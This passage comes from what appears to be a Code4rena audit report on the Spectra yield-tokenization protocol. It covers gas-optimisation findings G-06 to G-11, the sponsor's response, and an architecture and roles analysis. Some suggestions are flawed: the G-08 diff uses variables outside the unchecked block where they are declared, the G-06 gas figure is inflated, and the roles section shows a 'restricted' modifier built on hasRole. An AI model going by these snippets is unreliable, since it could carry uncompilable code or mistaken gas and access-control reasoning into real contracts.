109: override(IYieldToken, ERC20Upgradeable)
110: returns (uint8)
111: {
112: return IERC20Metadata(pt).decimals();
113: }`

(https://github.com/code-423n4/2024-02-spectra/blob/main/src/tokens/YieldToken.sol#L105C1-L113C6)

Recommended Mitigation Steps:

`File : src/libraries/PrincipalTokenUtil.sol

55: function _computeYield(
...
+ uint256 _ytDecimals = IYieldToken(_yt).decimals();
68: uint256 userYTBalanceInRay = IYieldToken(_yt).actualBalanceOf(_user).toRay(
- 69: IYieldToken(_yt).decimals()
+ 69: _ytDecimals
70: );

...

- 129: return _userYieldIBT + newYieldInIBTRay.fromRay(IERC20Metadata(_yt).decimals());
+ 129: return _userYieldIBT + newYieldInIBTRay.fromRay(_ytDecimals);
130: }`

## [G-06] Change the order of `modifier` checks in `functions` to fail early, it can save gas half of the time (Gas Saved ~22000 Gas)

Total Gas Saved: ~22000 half of the time

### Change the order of `nonReentrant` and `whenNotPaused` modifier checks from to high gas consumer one

The function incorporates three modifiers `notExpired`, `nonReentrant` and `whenNotPaused`. An optimization suggestion is made to reorder these modifiers for potential gas savings.
Place `nonReentrant` modifier at third and `whenNotPaused` at 2nd. Since `nonReentrant` takes almost ~24000 Gas due to it’s false to true changing value in storage when executed. While `whenNotPaused` have 1 Sload and some other opcodes of modifier.

### So when failing then fail with less gas consuming one first. It can save ~22000 GAS Half of the times.

`File : src/tokens/PrincipalToken

750: function _depositIBT(
751: uint256 _ibts,
752: address _ptReceiver,
753: address _ytReceiver
754: ) internal notExpired nonReentrant whenNotPaused returns (uint256 shares) {`

PrincipalToken.sol#L750-L754

Recommended Mitigation Steps:

`File : src/tokens/PrincipalToken

750: function _depositIBT(
751: uint256 _ibts,
752: address _ptReceiver,
753: address _ytReceiver
-754: ) internal notExpired nonReentrant whenNotPaused returns (uint256 shares) {
+754: ) internal notExpired whenNotPaused nonReentrant returns (uint256 shares) {`

## [G-07] State variables should be cached in stack variables rather than re-reading them from storage (Instances Missed by Bot) (Gas Saved ~100 Gas)

### `SAVE: 100 GAS, 1 SLOAD`

The instances below point to the second+ access of a state variable within a function. Caching of a state variable replaces each Gwarmaccess (100 gas) with a much cheaper stack read. Other less obvious fixes/optimizations include having local memory caches of state variable structs, or having local caches of state variable contracts/addresses.

### `ibtRate` can be cached to save 1 SLOAD 100 Gas ( 97 Gas technically)

`File : src/tokens/PrincipalToken.sol

906: uint256 currentPTRate = currentIBTRate < ibtRate
907: ? ptRate.mulDiv(
908: currentIBTRate,
909: ibtRate,
910: roundUpPTRate ? Math.Rounding.Ceil : Math.Rounding.Floor
911: )
912: : ptRate;
913: return (currentPTRate, currentIBTRate);
914: }`

PrincipalToken.sol#L906C2-L914C6

Recommended Mitigation Steps:

`File : src/tokens/PrincipalToken.sol

+ uint256 _ibtRate = ibtRate;

-906: uint256 currentPTRate = currentIBTRate < ibtRate
+906: uint256 currentPTRate = currentIBTRate < _ibtRate
907: ? ptRate.mulDiv(
908: currentIBTRate,
-909: ibtRate,
+909: _ibtRate,
910: roundUpPTRate ? Math.Rounding.Ceil : Math.Rounding.Floor
911: )
912: : ptRate;
913: return (currentPTRate, currentIBTRate);
914: }`

## [G-08] Use unchecked{} whenever underflow not possible (Instances Missed by bot)(Gas Saved ~320 Gas)

Note: Analyzer only talks about overflow errors so these underflow related instances also not covered by that

### Total Gas Saved : ~320 GAS in 2 Instances.

Because of previous condition check before the operation(-), it can be decided that underflow not possible.

### Saves ~160 GAS per instance

`File : src/libraries/PrincipalTokenUtil.sol

73: if (_oldPTRate == _ptRate && _ibtRate > _oldIBTRate) {

75: newYieldInIBTRay = ibtOfPTInRay.mulDiv(_ibtRate - _oldIBTRate, _ibtRate); //@audit due it's if condition it's subtraction can be unchecked

80: if (_ibtRate >= _oldIBTRate) {
...
95: } else {

104: uint256 expectedNegativeYieldInAssetRay = Math.ceilDiv(
105: ibtOfPTInRay * (_oldIBTRate - _ibtRate), //@audit since it is in else so subtraction can be unchecked

...
}`

(https://github.com/code-423n4/2024-02-spectra/blob/main/src/libraries/PrincipalTokenUtil.sol#L75C12-L75C86), (https://github.com/code-423n4/2024-02-spectra/blob/main/src/libraries/PrincipalTokenUtil.sol#L104C21-L105C65)

`File : src/libraries/PrincipalTokenUtil.sol

-75: newYieldInIBTRay = ibtOfPTInRay.mulDiv(_ibtRate - _oldIBTRate, _ibtRate);
+ unchecked {
+ uint256 ibtRateMinusOldIbtRate = _ibtRate - _oldIBTRate;
+ }
+ newYieldInIBTRay = ibtOfPTInRay.mulDiv(ibtRateMinusOldIbtRate, _ibtRate);

-104: uint256 expectedNegativeYieldInAssetRay = Math.ceilDiv(
-105: ibtOfPTInRay * (_oldIBTRate - _ibtRate),
+ unchecked {
+ uint256 oldIBTRateMinusIbtRate = _oldIBTRate - _ibtRate;
+ }
+ uint256 expectedNegativeYieldInAssetRay = Math.ceilDiv(
+ ibtOfPTInRay * (oldIBTRateMinusIbtRate),`

## [G-09] Use direct `_admin` immutable var. instead of calling `_proxyAdmin()` saves function call

We can access direct immutable `_admin` variable instead of accessing it through function `_proxyAdmin()`. It can save extra function call and saves some gas 100% safely.

`File : src/proxy/AMTransparentUpgradeableProxy.sol

88: ERC1967Utils.changeAdmin(_proxyAdmin());

94: function _proxyAdmin() internal virtual returns (address) {
95: return _admin;
96: }

101: function _fallback() internal virtual override {
102: if (msg.sender == _proxyAdmin()) {`

(https://github.com/code-423n4/2024-02-spectra/blob/main/src/proxy/AMTransparentUpgradeableProxy.sol#L88C9-L88C49), (https://github.com/code-423n4/2024-02-spectra/blob/main/src/proxy/AMTransparentUpgradeableProxy.sol#L101C1-L102C43)

`File : src/proxy/AMTransparentUpgradeableProxy.sol

-88: ERC1967Utils.changeAdmin(_proxyAdmin());
+88: ERC1967Utils.changeAdmin(_admin);

94: function _proxyAdmin() internal virtual returns (address) {
95: return _admin;
96: }

101: function _fallback() internal virtual override {
-102: if (msg.sender == _proxyAdmin()) {
+102: if (msg.sender == _admin) {`

## [G-10] Cache function result into stack var first instead of state variables if need to read them twice

`_getCurrentPTandIBTRates` function result can be cached into stack var. instead of `ptRate` and `ibtRate` state variables when state var. read just after that than better will be to read from stack var. again and assigning those stack var. into state var. also and emit those stack var. also. which saves 2 SLOAD (~200 gas)

### GAS SAVED 2 SLOAD (~200 GAS)

`File : src/tokens/PrincipalToken.sol

414: // PT rate not rounded up here
415: (ptRate, ibtRate) = _getCurrentPTandIBTRates(false);
416: emit RatesStoredAtExpiry(ibtRate, ptRate); //@audit avoid this read from state var. use stack var. instead`

PrincipalToken.sol#L414-L416

Recommended Mitigation Steps:

`File : src/tokens/PrincipalToken.sol
+ uint256 _ptRate;
+ uint256 _ibtRate;

-415: (ptRate, ibtRate) = _getCurrentPTandIBTRates(false);
-416: emit RatesStoredAtExpiry(ibtRate, ptRate);
+415: (_ptRate, _ibtRate) = _getCurrentPTandIBTRates(false);
+ ptRate = _ptRate;
+ ibtRate = _ibtRate;
+416: emit RatesStoredAtExpiry(_ibtRate, _ptRate); //read from stack var saved 2 SLOAD`

## [G-11] Check `amount` for `zero` before mint/burn (Missed by bot)

Note: Bot only covers check 0 value transfers in tranfser and transferFrom but not covered when minting and burning 0 amounts.

0 amount burning and minting doesn’t have any effect but just wastes gas when 0 value passed by mistake in mint/burn. Openzeppelin(used here) `mint/burn` will not revert when 0 amount passed. So it is better to revert early when amount is 0 in mint/burn rather than wasting more gas in 0 value minting/burning.

`File : src/tokens/YieldToken.sol

42: function burnWithoutUpdate(address from, uint256 amount) external override {
43: if (msg.sender != pt) {
44: revert CallerIsNotPtContract();
45: }
46: _burn(from, amount); //@audit gas check amount for 0
47: }

50: function mint(address to, uint256 amount) external override {
51: if (msg.sender != pt) {
52: revert CallerIsNotPtContract();
53: }
54: _mint(to, amount);//@audit gas check amount for 0
55: }

58: function burn(uint256 amount) public override {
59: IPrincipalToken(pt).updateYield(msg.sender);
60: _burn(msg.sender, amount);//@audit gas check amount for 0
61: }`

(https://github.com/code-423n4/2024-02-spectra/blob/main/src/tokens/YieldToken.sol#L42C1-L47C6), (https://github.com/code-423n4/2024-02-spectra/blob/main/src/tokens/YieldToken.sol#L50C5-L55C6), (https://github.com/code-423n4/2024-02-spectra/blob/main/src/tokens/YieldToken.sol#L58C5-L61C6)

jeanchambras (sponsor) acknowledged and commented:

We dispute G-06 because the way we do it, other modifiers are also impacted by the nonReentrant one which is a good practice.

Regarding G-09 and G-11, we acknowledge those, but won’t be tackling them since we trust Open Zeppelin contracts.

Mitigated G-01, G-02, G-04, G-05, G-07, and G-10 here.

# Audit Analysis

For this audit, 6 analysis reports were submitted by wardens. An analysis report examines the codebase as a whole, providing observations and advice on such topics as architecture, mechanism, or approach. The report highlighted below by hunter_w3b received the top score from the judge.

The following wardens also submitted reports: Myd, aariiif, ZanyBonzy, 0xbrett8571, and DarkTower.

# Analysis - Spectra Audit

## Description overview of `Spectra` Audit

Spectra is a permissionless interest rate derivatives protocol for DeFi. It allows users to split the yield generated by an Interest Bearing Token (IBT) from the principal asset.

Key Features:

- Yield Tokenization: Users can deposit IBTs into the protocol and receive Principal Tokens (PT) and Yield Tokens (YT) in return. The PT represents the principal asset, while the YT represents the yield generated by the IBT.

- Yield Trading: Holders of YT can claim the yield generated by the corresponding deposited IBTs during the time they hold the YT. This allows users to speculate on the evolution of DeFi interest rates, hedge risk on passive revenue, or provide liquidity to the derivatives layer.

Benefits:

- Enables new applications and use cases in the DeFi ecosystem.

- Allows users to access yield without having to wait for maturity.

- Provides opportunities for speculation and risk hedging.

## System Overview

### High-level System Overview

### Scope

-
tokens

- PrincipalToken.sol: The `PrincipalToken` contract is an ERC-20 token that represents a principal token (PT) issued by a vault. The vault holds an Interest Bearing Token (IBT) of a specific underlying asset. PTs represent a claim on the underlying asset held by the vault, plus any yield generated by the IBT.

-
Key Features

- Deposit and Withdraw: Users can deposit assets into the vault to mint PTs, or withdraw assets by redeeming PTs.

- Yield Generation: PTs generate yield from the IBT held by the vault. Users can claim this yield in IBT or the underlying asset.

- Fees: The contract charges fees for tokenization (depositing assets) and yield claiming.

- Interest Bearing Token (IBT): The vault holds an IBT, which is an ERC-4626 token representing a claim on the underlying asset and any interest earned on it.

- Yield Token (YT): The contract deploys a YT, which is an ERC-20 token that represents the yield generated by the IBT.

-
Other Notable Features

- Rates: The contract tracks the PT rate (PT price in asset) and IBT rate (IBT price in asset).

- Maturity: The contract has a maturity date (expiry). After maturity, the PT rate and IBT rate are stored.

- Flash Loans: The contract supports flash loans of IBTs.

- YieldToken.sol: This contract allows users to hold and transfer tokens that represent their yield ownership. It integrates with a PT contract to track yield and ensure that yield is updated before any YT transfers. The contract is designed to work seamlessly with the PT contract, providing a comprehensive solution for managing yield and principal tokens.

-
Key Features

- Yield Tracking: The YT contract keeps track of users’ yield ownership by minting YT tokens in proportion to the PT tokens held by each user.

- Integration with PT Contract: The YT contract interacts closely with the PT contract, allowing for seamless yield management. The PT contract updates the yield before any YT transfers, ensuring that users’ yield ownership is always accurate.

- Burn and Mint Functions: The YT contract provides functions for burning and minting YT tokens, which are only callable by the PT contract. This allows the PT contract to control the issuance and redemption of YT tokens.

- Transfer and TransferFrom Functions: The YT contract overrides the standard ERC20 `transfer` and `transferFrom` functions to update the yield before any transfer. This ensures that users’ yield ownership is maintained even after transfers.

-
Benefits of Using a YT Contract:

- Efficient Yield Management: The YT contract provides an efficient way to track and manage yield ownership, reducing the need for complex calculations and manual processes.

- Seamless Integration: The close integration with the PT contract ensures that yield is always up-to-date and that YT transfers are handled correctly.

- Transparency and Auditability: The contract is transparent and auditable, providing users with confidence in the accuracy of their yield ownership.

- Reduced Complexity: By abstracting away the complexities of yield management, the YT contract simplifies the process for users and developers.

-
proxy

- AMBeacon.sol: The `AMBeacon` contract, which is a modified version of the standard OpenZeppelin `UpgradeableBeacon` contract. It is used in conjunction with proxy contracts to determine their implementation contract.

-
Key Features:

- Upgradeable: The beacon allows for the implementation contract to be upgraded, changing the logic of the proxy contracts that use it.

- Access Control: Unlike the standard `UpgradeableBeacon` contract, which uses the Ownable pattern for access control, the `AMBeacon` contract uses the AccessManager contract from OpenZeppelin 5.0 for more granular access control.

- Role-Based Access: Access to the `upgradeTo` function, which upgrades the beacon’s implementation, is restricted to specific roles within the AccessManager contract.

-
Benefits of Using AMBeacon:

- Improved Security: By using the AccessManager contract for access control, the `AMBeacon` contract provides more granular control over who can upgrade the beacon’s implementation.

- Flexibility: The role-based access control allows for different levels of access to the `upgradeTo` function, making it suitable for various governance models.

- Reduced Complexity: The `AMBeacon` contract simplifies the process of upgrading proxy contracts by providing a central point of control for the implementation.

- AMProxyAdmin.sol: The `AMProxyAdmin` contract, which is a modified version of the standard OpenZeppelin `ProxyAdmin` contract. It is used to manage the upgrades of transparent upgradeable proxies.

-
Key Features:

- Proxy Management: The `AMProxyAdmin` contract allows for the upgrade of transparent upgradeable proxies to new implementation contracts.

- Access Control: Unlike the standard `ProxyAdmin` contract, which uses the Ownable pattern for access control, the `AMProxyAdmin` contract uses the AccessManager contract from OpenZeppelin 5.0 for more granular access control.

- Role-Based Access: Access to the `upgradeAndCall` function, which upgrades the proxy and calls a function on the new implementation, is restricted to specific roles within the AccessManager contract.

-
Benefits of Using AMProxyAdmin:

- Improved Security: By using the AccessManager contract for access control, the `AMProxyAdmin` contract provides more granular control over who can upgrade proxies.

- Flexibility: The role-based access control allows for different levels of access to the `upgradeAndCall` function, making it suitable for various governance models.

- Reduced Complexity: The `AMProxyAdmin` contract simplifies the process of upgrading proxies by providing a central point of control.

- AMTransparentUpgradeableProxy.sol: The `AMTransparentUpgradeableProxy` contract, which is a modified version of the standard OpenZeppelin `TransparentUpgradeableProxy` contract. It is used to create upgradeable transparent proxies that can be managed by a `ProxyAdmin` contract.

-
Key Features:

- Upgradeable: The proxy can be upgraded to a new implementation contract, changing the logic of the proxy.

- Transparent: The proxy forwards all calls to the implementation contract, making it appear as if the implementation contract is the actual contract being called.

- Access Control: Unlike the standard `TransparentUpgradeableProxy` contract, which uses the Ownable pattern for access control, the `AMTransparentUpgradeableProxy` contract uses the `AMProxyAdmin` contract from the same codebase for more granular access control.

- Role-Based Access: Access to the `upgradeToAndCall` function, which upgrades the proxy and calls a function on the new implementation, is restricted to specific roles within the `AMProxyAdmin` contract.

-
Benefits of Using AMTransparentUpgradeableProxy:

- Improved Security: By using the `AMProxyAdmin` contract for access control, the `AMTransparentUpgradeableProxy` contract provides more granular control over who can upgrade the proxy.

- Flexibility: The role-based access control allows for different levels of access to the `upgradeToAndCall` function, making it suitable for various governance models.

- Reduced Complexity: The `AMTransparentUpgradeableProxy` contract simplifies the process of upgrading proxies by providing a central point of control.

-
libraries

- PrincipalTokenUtil.sol: The `PrincipalTokenUtil`, is a library that provides utility functions for working with principal tokens. Principal tokens are `ERC-4626` tokens that represent a share of an underlying asset, such as a stablecoin or a basket of assets.

-
Key Features:

- Conversion Functions: The library provides functions to convert between the underlying asset and principal token shares, taking into account the current exchange rate.

- Yield Computation: The library provides a function to compute the yield accrued by a user since the last update, considering changes in the exchange rates of the principal token and the underlying asset.

- Fee Computation: The library provides functions to compute the tokenization fee, yield fee, and flashloan fee for a given amount, based on the fee rates stored in a registry contract.

-
Functions:

- `_convertToSharesWithRate`: Converts an amount of the underlying asset to an equivalent amount of principal token shares, using the specified exchange rate.

- `_convertToAssetsWithRate`: Converts an amount of principal token shares to an equivalent amount of the underlying asset, using the specified exchange rate.

- `_computeYield`: Computes the yield accrued by a user since the last update, considering changes in the exchange rates of the principal token and the underlying asset.

- `_tryGetTokenDecimals`: Attempts to fetch the token decimals for a given token address.

- `_computeTokenizationFee`: Computes the tokenization fee for a given amount, based on the fee rate stored in the registry contract.

- `_computeYieldFee`: Computes the yield fee for a given amount, based on the fee rate stored in the registry contract.

- `_computeFlashloanFee`: Computes the flashloan fee for a given amount, based on the fee rate stored in the registry contract.

-
Benefits of Using PrincipalTokenUtil:

- Simplified Calculations: The library provides convenient functions for performing common calculations related to principal tokens, such as converting between assets and shares, computing yield, and calculating fees.

- Accuracy and Precision: The library uses fixed-point arithmetic to ensure accurate and precise calculations, even for large amounts.

- Extensibility: The library can be easily extended to support additional functionality or integrations with other contracts.

- RayMath.sol: The `RayMath`, is a library that provides functions for converting between different decimal representations and a fixed-point representation called “Ray.” Ray is a fixed-point representation with 27 decimal places, and it is commonly used in decentralized finance (DeFi) applications to represent values such as exchange rates and asset prices.

-
Key Features:

- Decimal Conversions: The library provides functions to convert values from Ray to a specified number of decimal places, and vice versa.

- Rounding Control: The `fromRay` function allows for specifying whether the conversion should be rounded up or down to the nearest integer.

- Overflow Protection: The `toRay` function includes overflow protection to ensure that the conversion from a decimal representation to Ray does not result in an overflow.

-
Functions:

- fromRay: Converts a value from Ray to a specified number of decimal places.

- fromRay(uint256 `_a`, uint256 `_decimals`, bool `_roundUp`): Converts a value from Ray to a specified number of decimal places, with the option to round up or down.

- toRay: Converts a value with a specified number of decimal places to Ray.

-
Benefits of Using RayMath:

- Precision and Accuracy: Ray provides a fixed-point representation with high precision, making it suitable for representing values such as exchange rates and asset prices.

- Interoperability: Ray is a commonly used representation in DeFi applications, making it easy to integrate with other contracts and protocols.

- Overflow Protection: The `toRay` function includes overflow protection, ensuring that conversions from decimal representations to Ray do not result in overflows.

### Chains supported

Ethereum Mainnet

### Roles

-
Roles in the Spectra protocol:

- Admin Role: Has the highest level of authority and can execute administrative functions such as pausing and unpausing the contract, changing the rewards proxy, and storing rates at expiry.

- Pausable Role: Allows the account with this role to pause and unpause the contract.

- Yield Claimer Role: Has permissions to update and claim yield.

- Rewards Proxy Setter Role: Responsible for setting the rewards proxy contract address.

- Flash Loan Role: Enables the contract to perform flash loans.

- Beacon Authority: Responsible for managing the upgrade process by changing the implementation contract that the beacon points to.

- Proxy Admin Role: Responsible for administering proxy contracts, specifically instances of `TransparentUpgradeableProxy`. The proxy admin has the authority to upgrade a proxy to a new implementation and optionally call a function on the new implementation.

- Admin (AMTransparentUpgradeableProxy): Has the authority to upgrade the implementation of the proxy by calling the `_dispatchUpgradeToAndCall` function.

-
PrincipalToken.sol: In `PrincipalToken`, there are several roles defined through the usage of access control modifiers provided by the `AccessManagedUpgradeable` contract. These roles include:

-
Admin Role: This role is typically assigned to the contract deployer or owner. It has the highest level of authority and can execute administrative functions such as pausing and unpausing the contract, changing the rewards proxy, and storing rates at expiry.

`modifier restricted() {
require(hasRole(ADMIN_ROLE, _msgSender()), "Restricted to admins");
_;
}`

-
Pausable Role: This role allows the account with this role to pause and unpause the contract.

`/** @dev See {PausableUpgradeable-_pause}. */
function pause() external override restricted {
_pause();
}

/** @dev See {PausableUpgradeable-_unPause}. */
function unPause() external override restricted {
_unpause();
}

````

-
Yield Claimer Role: This role has permissions to update and claim yield.

`/** @dev See {IPrincipalToken-claimYield}. */
function claimYield(address _receiver) public override returns (uint256 yieldInAsset) {
// ...
}

/** @dev See {IPrincipalToken-claimYieldInIBT}. */
function claimYieldInIBT(address _receiver) public override returns (uint256 yieldInIBT) {
// ...
}`

-
Rewards Proxy Setter Role: This role is responsible for setting the rewards proxy contract address.

`/** @dev See {IPrincipalToken-setRewardsProxy}. */
function setRewardsProxy(address _rewardsProxy) external restricted {
// ...
}`

-
Flash Loan Role: This role enables the contract to perform flash loans.

`/**
* @dev See {IERC3156FlashLender-flashLoan}.
*/
function flashLoan(
IERC3156FlashBorrower _receiver,
address _token,
uint256 _amount,
bytes calldata _data
) external override returns (bool) {
// ...
}`

These roles are implemented using the `hasRole` function provided by OpenZeppelin’s `AccessControlUpgradeable` contract and are enforced through the `restricted` modifier applied to various functions throughout the contract. Each of these roles grants specific permissions to perform certain actions within the contract, ensuring proper access control and security.

-
AMBeacon.sol:

- Beacon Authority: This role is responsible for managing the upgrade process by changing the implementation contract that the beacon points to. The beacon authority can call the `upgradeTo` function to upgrade the beacon to a new implementation. By default, the `restricted` modifier ensures that only accounts with the appropriate role in the authority (typically the ADMIN_ROLE of the AccessManager contract) can perform upgrades. This role is assumed to be managed by an AccessManager contract.

- Implementation Contract: While not explicitly defined within this contract, the beacon points to an implementation contract whose address is stored in the `_implementation` variable. This contract is responsible for providing the logic that proxies will delegate function calls to. The beacon’s `upgradeTo` function allows changing the implementation contract to a new one, effectively upgrading the logic of proxies that rely on this beacon.

These two roles define the primary interactions and responsibilities within the contract.

-
AMProxyAdmin.sol:

- Proxy Admin Role: This role is responsible for administering proxy contracts, specifically instances of `TransparentUpgradeableProxy`. The proxy admin has the authority to upgrade a proxy to a new implementation and optionally call a function on the new implementation. The proxy admin role is restricted to accounts that have the appropriate role in the access manager contract, which is enforced by the `restricted` modifier. The `upgradeAndCall` function allows upgrading the proxy and calling a function on the new implementation, if required. The access control for this function ensures that only authorized accounts can perform upgrades and calls on the proxy.

This role is managed by an access manager contract, and only accounts with the necessary permissions (typically assigned to specific roles like `ADMIN_ROLE`) can perform proxy upgrades and function calls.

- AMTransparentUpgradeableProxy.sol: In `AMTransparentUpgradeableProxy` contract, the only role defined is that of the admin. The admin has the authority to upgrade the implementation of the proxy by calling the `_dispatchUpgradeToAndCall` function. Other than the admin, there are no specific roles defined within this contract.

### Invariants Generated

- IBT rate is only updated upon user interactions with our protocol

- PT rate is only updated after an accounted negative rate change on the IBT rate

- PT and its YT should have an equal supply at all times

- PT rate should not increase

- ptRateOfUser(u) ≥ ptRate for all u in users with users being all the users that deposited in the PT.

- Accounted IBT rate cannot decrease without impacting PT rate

- If the protocol records an IBT rate decrease, the PT rate has to decrease to account for the negative rate.

- Principal Token is ERC5095

- All EIP-5095 invariants should hold such as previewRedeem ≥ redeem.

-
Principal Token deposit

- previewDeposit ≤ deposit : the preview of shares minted upon depositing should be less than or equal to the actual shares minted.

## Approach Taken-in Evaluating `Spectra` Protocol

Accordingly, I analyzed and audited the subject in the following steps;

-
Core Protocol Contract Overview:

I focused on thoroughly understanding the codebase and providing recommendations to improve its functionality.
The main goal was to take a close look at the important contracts and how they work together in the `Spectra` protocol.

I start with the following contracts, which play crucial roles in the Spectra:

Main Contracts I Looked At

I start with the following contracts, which play crucial roles in the `Spectra`:

` PrincipalToken.sol
YieldToken.sol
AMBeacon.sol
AMProxyAdmin.sol
AMTransparentUpgradeableProxy.sol
PrincipalTokenUtil.sol
RayMath.sol`

I started my analysis by examining the intricate structure and functionalities of the `Spectra` protocol, which is a comprehensive suite of contracts that enables the creation and management of `yield-bearing` tokens. The protocol consists of three main components: tokens, proxy contracts, and libraries. The tokens include the `PrincipalToken` and `YieldToken`, which represent the principal and yield components of a yield-bearing asset, respectively. The proxy contracts include the `AMBeacon`, `AMProxyAdmin`, and `AMTransparentUpgradeableProxy`, which provide a flexible and secure mechanism for upgrading the implementation of the protocol’s contracts. The libraries include the `PrincipalTokenUtil` and `RayMath`, which provide utility functions for working with principal tokens and fixed-point representations, respectively.

-
Documentation Review:

I then went to review this doc for a more detailed and technical explanation of the `Spectra`.

- Compiling code and running provided tests:

-
Manuel Code Review In this phase, I initially conducted a line-by-line analysis, following that, I engaged in a comparison mode.

- Line by Line Analysis: Pay close attention to the contract’s intended functionality and compare it with its actual behavior on a line-by-line basis.

- Comparison Mode: Compare the implementation of each function with established standards or existing implementations, focusing on the function names to identify any deviations.

## Codebase Quality

Overall, I consider the quality of the `Spectra` protocol codebase to be Good. The code appears to be mature and well-developed. We have noticed the implementation of various standards adhere to appropriately. Details are explained below:

Codebase Quality Categories
Comments

Architecture & Design
The protocol features a modular design, segregating functionality into distinct contracts (e.g., proxy, token, libraries) for clarity and ease of maintenance. The use of libraries like RayMath for mathematical operations also indicates thoughtful design choices aimed at optimizing contract performance and gas efficiency.

Upgradeability & Flexibility
The project does implement upgradeability patterns (e.g., proxy contracts), which might impact long-term maintainability. Considering an upgrade path or versioning strategy could enhance the project’s flexibility in addressing future requirements..

Error Handling & Input Validation
Functions check for conditions and validate inputs to prevent invalid operations, though the depth of validation (e.g., for edge cases transactions) would benefit from closer examination.

Security Practices
The contracts demonstrate awareness of common security pitfalls in Solidity development. Functions are guarded with appropriate access control modifiers (e.g., `onlyOwner`, `isAdmin` checks), and state-changing functions are protected against reentrancy attacks. However, a comprehensive external security audit would be necessary to validate the absence of deeper vulnerabilities.

Code Maintainability and Reliability
The provided contracts are well-structured, exhibiting a solid foundation for maintainability and reliability. Each contract serves a specific purpose within the ecosystem, following established patterns and standards. This adherence to best practices and standards ensures that the code is not only secure but also future-proof. The usage of contracts for implementing token and security features like access control further underscores the commitment to code quality and reliability. However, the centralized control present in the form of admin and owner privileges could pose risks to decentralization and trust in the long term. Implementing decentralized governance or considering upgradeability through proxy contracts could mitigate these risks and enhance overall reliability.

Code Comments
The contracts are accompanied by comprehensive comments, facilitating an understanding of the functional logic and critical operations within the code. Functions are described purposefully, and complex sections are elucidated with comments to guide readers through the logic. Despite this, certain areas, particularly those involving intricate mechanics or tokenomics, could benefit from even more detailed commentary to ensure clarity and ease of understanding for developers new to the project or those auditing the code.

Testing
The contracts exhibit a commendable level of test coverage, approaching nearly 100%, which is indicative of a robust testing regime. This coverage ensures that a wide array of functionalities and edge cases are tested, contributing to the reliability and security of the code. However, to further enhance the testing framework, the incorporation of fuzz testing and invariant testing is recommended. These testing methodologies can uncover deeper, systemic issues by simulating extreme conditions and verifying the invariants of the contract logic, thereby fortifying the codebase against unforeseen vulnerabilities.

Code Structure and Formatting
The codebase benefits from a consistent structure and formatting, adhering to the stylistic conventions and best practices of Solidity programming. Logical grouping of functions and adherence to naming conventions contribute significantly to the readability and navigability of the code. While the current structure supports clarity, further modularization and separation of concerns could be achieved by breaking down complex contracts into smaller, more focused components. This approach would not only simplify individual contract logic but also facilitate easier updates and maintenance.

Strengths
Among the notable strengths of the codebase are its adherence to innovative integration of blockchain technology. The utilization of libraries for security and standard compliance emphasizes a commitment to code safety and interoperability. The creative use of PrincipalTokenUtil.sol and RayMath.sol in the yields mechanics demonstrates.

Documentation
The contracts themselves contain comments and some descriptions of functionality, which aids in understanding the immediate logic. It was learned that the project also provides external documentation. However, it has been mentioned that this documentation is somewhat outdated. For a project of this complexity and scope, keeping the documentation up-to-date is crucial for developer onboarding, security audits, and community engagement. Addressing the discrepancies between the current codebase and the documentation will be essential for ensuring that all stakeholders have a clear and accurate understanding of the system’s architecture and functionalities.

## Architecture

### Principal Token

PrincipalToken

This is the core contract of Spectra. The Principal Token is EIP-5095 and EIP-2612 compliant. Users can deposit an EIP-4626 IBT or the underlying token of that IBT and receive Principal Tokens (PT) and Yield Tokens (YT). The PT contract holds the logic that separates the yield generated from the principal asset deposited in the IBT.

### Yield Token

YieldToken

This contract represents the Yield Token (YT). The YT is an EIP-20 token and follows the EIP-2612 standard. The same amount of PT and YT is minted upon depositing into the protocol (`PrincipalToken.deposit`, `PrincipalToken.depositIBT`). The YT captures the yield generated by the deposited principal. Holding the YT allows the user to claim the corresponding amount of yield generated by the IBTs deposited in the associated PT contract.

### Access Manager and Ownable

The Spectra protocol uses the OpenZeppelin AccessManager to manage the access control of the different protected functions.

We thus modified the Openzepellin Transparent Proxy, Beacon Proxy and Proxy Admin of OpenZeppelin to leverage the access manager instead of the Ownable pattern for the upgrade and admin functions.

File Name
Core Functionality
Technical Characteristics
Importance and Management

PrincipalToken.sol
The `PrincipalToken` contract implements functionality for managing principal tokens, including depositing, withdrawing, redeeming, claiming fees and yields, and handling flash loans.
It utilizes various interfaces and libraries such as `ERC20PermitUpgradeable`, `AccessManagedUpgradeable`, `ReentrancyGuardUpgradeable`, `PausableUpgradeable`, `IERC4626`, and `IERC3156FlashBorrower`.
The contract’s functionality is crucial for managing principal tokens, ensuring secure and efficient operations through modifiers like `notExpired`, `afterExpiry`, and internal functions for conversions and rate calculations. Additionally, it handles fee claiming, yield updates, and flash loans while managing various state variables and emitting relevant events.

YieldToken.sol
The Yield Token (YT) contract tracks users’ yield ownership, minted in sync with Principal Tokens (PT).
It inherits from ERC20PermitUpgradeable, uses OpenZeppelin’s Math library for arithmetic operations, and implements various functions for burning, minting, transferring, and checking balances.
It ensures accurate tracking of yield ownership, integrates with the associated PT contract for updates, and manages transfers while enforcing certain conditions through modifier-based validations.

AMBeacon.sol
The `AMBeacon` contract facilitates the determination of implementation contracts for BeaconProxy instances, allowing dynamic upgrading of their functionality.
It inherits from AccessManaged for access control, utilizes the `IBeacon` interface, and emits events to signal implementation upgrades.
It enables secure and flexible contract upgrades by allowing only authorized parties to change the implementation address, managed through the Access Manager contract.

AMProxyAdmin.sol
The AMProxyAdmin contract serves as an admin for TransparentUpgradeableProxy instances, facilitating their upgrading and function invocation.
It utilizes AccessManaged for access control, defines a version for the upgrade interface, and includes a function to upgrade and call a new implementation.
This contract ensures secure and controlled upgrading of proxy contracts, with access managed through the Access Manager contract.

AMTransparentUpgradeableProxy.sol
The AMTransparentUpgradeableProxy contract implements a transparent upgradeable proxy pattern, allowing for upgradability of contracts while maintaining transparency.
It uses ERC1967Proxy as a base, employs a custom dispatch mechanism for upgrade and call functionality, and sets the admin during construction as an immutable variable.
This contract ensures secure and transparent upgrades of proxy contracts, with administrative control managed by an instance of ProxyAdmin, facilitating seamless transitions to new implementations.

PrincipalTokenUtil.sol
The PrincipalTokenUtil library provides functions for converting assets to shares and vice versa, computing user yield, and fetching token decimals.
It uses math and rounding libraries for precise calculations, handles rate errors, and interacts with ERC20 token contracts to retrieve decimals.
This library plays a crucial role in managing tokenization fees, yield fees, and flashloan fees, ensuring accurate calculations and efficient fee management in token-related operations.

RayMath.sol
The RayMath library provides functions for converting values between Ray (27-decimal precision) and specified decimal precisions.
It utilizes assembly code for efficient calculations, rounding options for precision control, and ensures integrity in value conversion.
This library is essential for precise arithmetic operations involving different decimal precisions, ensuring accurate conversions and calculations in decentralized finance (DeFi) applications.

